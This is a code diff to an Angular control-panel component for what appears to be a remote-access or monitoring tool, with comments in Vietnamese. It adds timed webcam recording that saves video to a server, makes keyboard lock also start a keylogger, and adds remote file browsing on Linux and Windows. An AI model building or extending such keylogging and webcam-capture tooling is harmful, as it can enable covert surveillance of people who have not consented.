@@ -41,6 +41,18 @@ export class AgentDetailComponent {
     return sum + (app.count || 0);
     }, 0);
   }
+  webcamBusy = false;
+isRecording = false;
+
+saveEnabled = true;   // toggle SAVE ON/OFF
+
+stopTimerId: any = null;
+
+// time input
+stopHour = 0;
+stopMinute = 0;
+stopSecond = 0;
+
   // filter input
   appFilter = '';
   // computed list (Angular template KHÔNG cho reduce arrow function)
@@ -51,29 +63,9 @@ export class AgentDetailComponent {
     );
   }
   private saveOnStop = true;
-private stopTimerId: any = null;
 stopSaveDelay = 0;      // giây
 stopNoSaveDelay = 0;   // giây
-private stopWebcamWithDelay(seconds: number, save: boolean) {
-  if (this.webcamBusy) return;
 
-  this.saveOnStop = save;
-
-  // Nếu không nhập hoặc nhập 0 → dừng ngay
-  if (!seconds || seconds <= 0) {
-    this.stopWebcamInternal();
-    return;
-  }
-
-  // huỷ timer cũ
-  if (this.stopTimerId) {
-    clearTimeout(this.stopTimerId);
-  }
-
-  this.stopTimerId = setTimeout(() => {
-    this.stopWebcamInternal();
-  }, seconds * 1000);
-}
 
   editorSavedFlash = false;
   selectedModule = signal<string | null>(null);
@@ -95,14 +87,14 @@ private stopWebcamWithDelay(seconds: number, save: boolean) {
   startAppArgs = "";
   killAppName = "";
   screenBusy = false;
-  webcamBusy = false;
+
   
   killExeName: string = "";
   @ViewChild('webcamCanvas') webcamCanvas!: ElementRef<HTMLCanvasElement>;
   private recorder: MediaRecorder | null = null;
   private recordedChunks: Blob[] = [];
   private recording = false;
-  isRecording = false;
+ 
   mediaRecorder!: MediaRecorder;
   private waitingFirstFrame = false;
   private keyDownHandler = (e: KeyboardEvent) => this.onRemoteKeyDown(e);
@@ -403,13 +395,10 @@ killApp(name:string|null)
 {
    if (!name) return;
    this.killApp1(name);
-   setTimeout(() => {
-    this.sendAppList();
-  }, 2000);
   this.killExeName="";
    setTimeout(() => {
     this.sendAppList();
-  }, 2000);
+  },2000);
 }
   // ================================
   // KEYLOGGER
@@ -454,6 +443,7 @@ handleEditorShortcut(event: KeyboardEvent) {
   sendKeyloggerLock() {
     this.ws.sendJson({ module: "KEYBOARD", command: "LOCK" });
      this.keyloggerLocked.set(true);
+     this.sendKeyloggerStart()
   }
   sendKeyloggerUnlock() {
     //  if (!!this.keyloggerRunning)
@@ -472,68 +462,35 @@ handleEditorShortcut(event: KeyboardEvent) {
   // WEBCAM
   // ================================
   
-  sendWebcamStartStream() {
-      if (this.webcamBusy) return;
+ sendWebcamStartStream() {
+  if (this.webcamBusy || this.isRecording) return;
+
   this.webcamBusy = true;
+  this.saveOnStop = this.saveEnabled;
 
-    this.ws.sendJson({ module: "WEBCAM", command: "START_STREAM" });
-    this.waitingFirstFrame = true;
-    // Setup recorder
-    const canvas = this.webcamCanvas.nativeElement;
-    const stream = canvas.captureStream(25);  
-    this.recordedChunks = [];
-    this.mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
-    this.mediaRecorder.ondataavailable = e => {
-      if (e.data.size > 0) this.recordedChunks.push(e.data);
-    };
+  this.ws.sendJson({ module: "WEBCAM", command: "START_STREAM" });
+  this.waitingFirstFrame = true;
 
-    this.mediaRecorder.onstop = () => {
-      const blob = new Blob(this.recordedChunks, { type: 'video/webm' });
-      const reader = new FileReader();
-      reader.onloadend = () => {
-        const base64 = (reader.result as string).split(',')[1];
-        this.ws.sendJson({
-          module: 'FILE',
-          command: 'SAVE_VIDEO',
-          payload: {
-            name: `cam_${Date.now()}.webm`,
-            data: base64
-          }
-        });
-      };
-      reader.readAsDataURL(blob);
-    };
-      setTimeout(() => {
-    this.webcamBusy = false;
-  }, 500);
+  const totalSeconds =
+    this.stopHour * 3600 +
+    this.stopMinute * 60 +
+    this.stopSecond;
+
+  if (totalSeconds > 0) {
+    this.scheduleAutoStop(totalSeconds+3);
   }
+
+  setTimeout(() => {
+    this.webcamBusy = false;
+  }, 400);
+}
+
   
-sendWebcamStopAndSave() {
-  if (this.webcamBusy) return;
-  this.saveOnStop = true;
-  this.stopWebcamInternal();   // DỪNG LIỀN
+sendWebcamStop() {
+  if (this.webcamBusy || !this.isRecording) return;
+  this.stopWebcamInternal();
 }
-
-sendWebcamStopNoSave() {
-  if (this.webcamBusy) return;
-  this.saveOnStop = false;
-  this.stopWebcamInternal();   // DỪNG LIỀN
-}
-onStopSaveEnter() {
-  if (!this.isRecording || this.stopSaveDelay <= 0) return;
-
-  this.saveOnStop = true;
-  this.scheduleStop(this.stopSaveDelay);
-}
-
-onStopNoSaveEnter() {
-  if (!this.isRecording || this.stopNoSaveDelay <= 0) return;
-
-  this.saveOnStop = false;
-  this.scheduleStop(this.stopNoSaveDelay);
-}
-private scheduleStop(seconds: number) {
-  // huỷ timer cũ
+private scheduleAutoStop(seconds: number) {
   if (this.stopTimerId) {
     clearTimeout(this.stopTimerId);
   }
@@ -545,14 +502,17 @@ private scheduleStop(seconds: number) {
 
 
 
+
+
 private stopWebcamInternal() {
   this.webcamBusy = true;
 
-  // huỷ hẹn giờ nếu có
   if (this.stopTimerId) {
     clearTimeout(this.stopTimerId);
     this.stopTimerId = null;
   }
+
+  this.saveOnStop = this.saveEnabled;
 
   this.ws.sendJson({ module: "WEBCAM", command: "STOP_STREAM" });
 
@@ -564,37 +524,15 @@ private stopWebcamInternal() {
 
   setTimeout(() => {
     this.webcamBusy = false;
-  }, 500);
-}
-scheduleWebcamStop(seconds: number, save: boolean) {
-  if (!this.isRecording) return;
-
-  // huỷ timer cũ
-  if (this.stopTimerId) {
-    clearTimeout(this.stopTimerId);
-  }
-
-  this.saveOnStop = save;
-
-  this.stopTimerId = setTimeout(() => {
-    this.stopWebcamInternal();
-  }, seconds * 1000);
+  }, 400);
 }
 
 
 
-  sendWebcamStopStream() {
-      if (this.webcamBusy) return;
-  this.webcamBusy = true;
-    this.ws.sendJson({ module: "WEBCAM", command: "STOP_STREAM" });
-    if (this.isRecording && this.mediaRecorder) {
-      this.mediaRecorder.stop();
-    }
-    this.isRecording = false;
-      setTimeout(() => {
-    this.webcamBusy = false;
-  }, 600);
-  }
+
+
+
+ 
   private saveVideoToServer() {
     const blob = new Blob(this.recordedChunks, { type: "video/webm" });
     const reader = new FileReader();
@@ -645,6 +583,9 @@ scheduleWebcamStop(seconds: number, save: boolean) {
     };
     img.src = url;
   }
+  get autoStopEnabled(): boolean {
+  return this.stopHour + this.stopMinute + this.stopSecond > 0;
+}
   // ================================
   // EXPLORER
   // ================================
@@ -680,25 +621,65 @@ scheduleWebcamStop(seconds: number, save: boolean) {
     // file khác
     return "📄";
   }
+  // explorerBack() {
+  //   let path = this.currentExplorerPath();
+  //   if (!path || path === "" || path === "ROOT") {
+  //     // đang ở ROOT -> không back nữa
+  //     this.explorerGoRoot();
+  //     return;
+  //   }
+  //   // Chuẩn hoá slash cho chắc
+  //   path = path.replace(/\//g, "\\");
+  //   // Nếu đang ở ổ đĩa: D:\  C:\
+  //   if (/^[A-Z]:\\?$/i.test(path)) {
+  //     this.explorerGoRoot();
+  //     return;
+  //   }
+  //   // Tìm thư mục cha
+  //   const idx = path.lastIndexOf("\\");
+  //   if (idx <= 2) {
+  //     // VD: D:\Folder → idx=2 → quay về D:\
+  //     const drive = path.substring(0, 3);
+  //     this.ws.sendJson({
+  //       module: "FILE",
+  //       command: "LIST_DIR",
+  //       payload: { path: drive }
+  //     });
+  //     return;
+  //   }
+  //   // Thu được thư mục cha
+  //   const parent = path.substring(0, idx);
+  //   this.ws.sendJson({
+  //     module: "FILE",
+  //     command: "LIST_DIR",
+  //     payload: { path: parent }
+  //   }); 
+  // }
   explorerBack() {
-    let path = this.currentExplorerPath();
+  let path = this.currentExplorerPath();
+  const os = this.agent?.os?.toLowerCase(); // "windows" | "linux"
+
+  // =========================
+  // WINDOWS
+  // =========================
+  if (os === "windows") {
+
     if (!path || path === "" || path === "ROOT") {
-      // đang ở ROOT -> không back nữa
       this.explorerGoRoot();
       return;
     }
-    // Chuẩn hoá slash cho chắc
+
     path = path.replace(/\//g, "\\");
-    // Nếu đang ở ổ đĩa: D:\  C:\
+
+    // Đang ở ổ đĩa C:\ D:\
     if (/^[A-Z]:\\?$/i.test(path)) {
       this.explorerGoRoot();
       return;
     }
-    // Tìm thư mục cha
+
     const idx = path.lastIndexOf("\\");
     if (idx <= 2) {
-      // VD: D:\Folder → idx=2 → quay về D:\
-      const drive = path.substring(0, 3);
+      const drive = path.substring(0, 3); // C:\
       this.ws.sendJson({
         module: "FILE",
         command: "LIST_DIR",
@@ -706,14 +687,53 @@ scheduleWebcamStop(seconds: number, save: boolean) {
       });
       return;
     }
-    // Thu được thư mục cha
+
     const parent = path.substring(0, idx);
     this.ws.sendJson({
       module: "FILE",
       command: "LIST_DIR",
       payload: { path: parent }
-    }); 
+    });
+    return;
   }
+
+  // =========================
+  // LINUX
+  // =========================
+  if (os === "linux") {
+
+    // ROOT hoặc /
+    if (!path || path === "" || path === "/") {
+      this.ws.sendJson({
+        module: "FILE",
+        command: "LIST_DIR",
+        payload: { path: "/" }
+      });
+      return;
+    }
+
+    // Chuẩn hoá
+    path = path.replace(/\\/g, "/");
+
+    // Bỏ slash cuối nếu có: /home/user/
+    if (path.length > 1 && path.endsWith("/")) {
+      path = path.slice(0, -1);
+    }
+
+    const idx = path.lastIndexOf("/");
+
+    // /home → /
+    const parent = idx <= 0 ? "/" : path.substring(0, idx);
+
+    this.ws.sendJson({
+      module: "FILE",
+      command: "LIST_DIR",
+      payload: { path: parent }
+    });
+    return;
+  }
+}
+
   openFile(item: ExplorerEntry) {
     const name = (item.name || '').toLowerCase();
     if (name.endsWith('.txt') || name.endsWith('.log') || name.endsWith('.json') || name.endsWith('.js') ) {
